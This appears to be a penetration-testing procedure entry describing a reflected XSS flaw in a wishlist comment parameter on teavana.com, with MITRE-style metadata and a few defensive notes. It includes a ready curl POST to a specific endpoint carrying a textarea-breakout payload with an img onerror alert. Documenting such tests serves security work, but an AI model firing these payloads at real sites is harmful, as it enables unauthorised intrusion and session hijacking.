---
id: 123e4567-e89b-12d3-a456-426614174002
name: Test-Reflected-XSS-in-Wishlist-Comment
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.922Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
tags:
  - xss
  - reflected-xss
  - javascript
commands:
  - '[[commands/post-xss-payload-to-wishlist]]'
platforms:
  - Web
tools: []
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Test-Reflected-XSS-in-Wishlist-Comment

## Summary

This procedure tests for reflected cross-site scripting (XSS) in the wishlistComment parameter by submitting a payload that breaks out of a textarea element and executes JavaScript on teavana.com.

## Description

The wishlist comment endpoint reflects user input directly into an HTML textarea without sanitization, allowing attackers to inject closing tags and script elements. In a Demandware environment, this leads to immediate JS execution upon response rendering. The procedure assumes endpoint knowledge and uses a simple img onerror payload; outcomes include proof-of-concept execution like an alert, highlighting risks for session hijacking.

## Requirements

1. Proxy tool (e.g., Burp Suite) for request interception
2. Knowledge of wishlist ID (:id parameter)
3. Basic understanding of HTML/JS payloads

## Defense

Defensive measures and detection strategies:

- Sanitize/escape user input before HTML insertion
- Implement Content Security Policy (CSP) to block inline scripts
- Log and alert on suspicious payloads in comments

## Objectives

1. Confirm unsanitized reflection in response
2. Demonstrate JS execution capability
3. Assess self-XSS potential before chaining

## Instructions

### Step 1: Submit Malicious Payload

**Context**: Craft and send a POST request with an XSS payload to breakout of the textarea.

**Command** ([[commands/post-xss-payload-to-wishlist]]):
```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1005285074' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'wishlistComment=</textarea><img src=x onerror=alert(1)>'
```

> The payload closes the textarea and injects an img tag with onerror=alert(1). Expected output: Response reflects the payload unsanitized, executing alert(1) in the browser.

### Step 2: Verify Execution

**Context**: Render the response in a browser or proxy repeater to observe JS trigger.

> Inspect HTML for '<textarea ...></textarea><img src=x onerror=alert(1)></textarea>' and confirm popup.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/post-xss-payload-to-wishlist]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
